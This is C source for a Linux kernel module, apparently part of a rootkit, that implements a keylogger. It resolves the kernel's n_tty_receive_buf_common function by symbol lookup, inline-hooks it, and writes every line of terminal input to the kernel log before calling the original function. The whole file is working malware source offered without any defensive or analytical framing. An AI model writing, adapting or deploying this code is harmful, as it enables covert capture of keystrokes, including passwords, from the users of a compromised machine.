#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/kallsyms.h>
#include <linux/tty.h>
#include "rootkit.h"

unsigned long* o_n_tty_receive_buf_common;
unsigned char* buff_original_code;


typedef int (*n_tty_receive_buf_common_t) (struct tty_struct *tty, const unsigned char *cp,
			 char *fp, int count, int flow);

n_tty_receive_buf_common_t n_tty_receive_buf_common;


int my_n_tty_receive_buf_common(struct tty_struct *tty, const unsigned char *cp, char *fp, int count) {

	int result;

	if (strcmp(cp, "") != 0) {
		printk("%s", cp);	
	}

	// stoping the hook 
	hijack_stop(o_n_tty_receive_buf_common, buff_original_code);

	// calling the original function 	
	result = n_tty_receive_buf_common(tty, cp, fp, count, 0);

	// hooking the original function again
	hijack_start(o_n_tty_receive_buf_common, my_n_tty_receive_buf_common, &buff_original_code);

	return result;
	
}


int start_key_logger(void){
		
	// getting original address of the function 
	o_n_tty_receive_buf_common =  (void *) kallsyms_lookup_name("n_tty_receive_buf_common");

	// casting to function type (typedef of the function )
	n_tty_receive_buf_common = (n_tty_receive_buf_common_t) (unsigned char *) o_n_tty_receive_buf_common;

	// starting function inline hooking
	hijack_start(o_n_tty_receive_buf_common, my_n_tty_receive_buf_common, &buff_original_code);

	return 0;
}


int stop_key_logger(void){

	// removing the hook 
	hijack_stop(o_n_tty_receive_buf_common, buff_original_code);
}

